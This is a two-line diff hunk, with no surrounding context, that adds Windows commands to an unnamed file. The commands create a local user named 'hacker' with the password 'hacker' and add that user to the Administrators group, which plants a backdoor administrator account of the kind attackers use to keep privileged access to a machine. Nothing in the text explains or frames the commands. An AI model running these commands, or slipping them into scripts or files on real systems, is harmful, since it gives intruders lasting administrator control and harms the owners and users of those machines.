@@ -1,0 +1,2 @@
+net users hacker hacker /add
+net localgroup administrators hacker /add
